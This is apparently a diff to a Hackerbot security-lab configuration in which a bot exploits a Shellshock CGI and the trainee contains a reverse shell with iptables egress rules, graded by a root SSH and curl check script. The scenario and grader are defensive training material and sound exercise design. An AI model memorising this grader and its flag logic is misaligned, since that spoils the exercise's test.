+		<post_shell>sleep 1; if [ -f /tmp/hb_webfail_a9 ]; then echo HB_WEB_SSH_FAIL; exit 0; fi; CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 http://<%= $web_server_ip %>/cgi-bin/test.cgi); LEAK=$(<%= $ssh %> root@<%= $web_server_ip %> 'if [ -f <%= $shell_marker %> ]; then echo yes; rm -f <%= $shell_marker %>; else echo no; fi' 2>/dev/null) || { echo HB_WEB_SSH_FAIL; exit 0; }; if [ "$LEAK" = yes ]; then echo HB_STILL_LEAKING; exit 0; fi; case "$CODE" in 2*|3*) echo HB_CONTAINED;; *) echo HB_SITE_DOWN;; esac</post_shell>
+		<suppress_command_output_feedback />
+
+		<prompt>Contain the breach. This time I break in over the web server itself (the Shellshock CGI on port 80), so you can't just block the way in without taking the web server offline. Instead, use a packet filter (iptables) on the web_server VM to block just my reverse shell's way out: my shell connects back to me on the same port the data left on during the incident (attack 4), so drop the web server's outbound traffic to that port. Leave inbound port 80 open so the web server keeps serving, and don't block all traffic to me or you'll cut the SSH I use to check your work. When you say 'ready' I'll attack again, then check whether the data got out and whether the web server still answers.</prompt>
+
+		<condition>
+			<output_matches>HB_WEB_SSH_FAIL</output_matches>
+			<message>:( Couldn't reach the web server (<%= $web_server_ip %>) over SSH. Your packet filter needs to leave SSH open.</message>
+		</condition>
+		<condition>
+			<output_matches>HB_STILL_LEAKING</output_matches>
+			<message>:( I still got my shell and pulled the data out. Blocking the way in means blocking port 80, which takes the web server down; block my reverse shell's way *out* instead (egress to me).</message>
+		</condition>
+		<condition>
+			<output_matches>HB_SITE_DOWN</output_matches>
+			<message>:( No shell for me, but the web server on web_server isn't answering either. Containment shouldn't take the service offline: leave inbound port 80 open and block only my outbound reverse shell.</message>
+		</condition>
+		<condition>
+			<output_matches>HB_CONTAINED</output_matches>
+			<message>:) Contained: no shell, no data left the network, and the web server still serves on port 80. <%= $flags.pop %></message>
+		</condition>
+		<condition>
+			<output_matches>HB_SENT</output_matches>
+			<message>I'm in...</message>
+		</condition>
+		<condition>
+			<output_matches>HB_PRE_DONE</output_matches>
+			<message>Continuing...</message>
+		</condition>
+		<!-- the shell replied without the data (seen on the first attack after the VMs start); the check that follows says what happened -->
+		<condition>
+			<output_not_matches>HB_</output_not_matches>
+			<message>I got a shell, but the data hasn't come back yet (the first attack after the VMs start is often slow). Checking...</message>
+		</condition>
+		<else_condition>
+			<message>:( Something was not quite right... If this keeps happening, say 'ready' to try again.</message>
+		</else_condition>
+
 	</attack>
 
 </hackerbot>
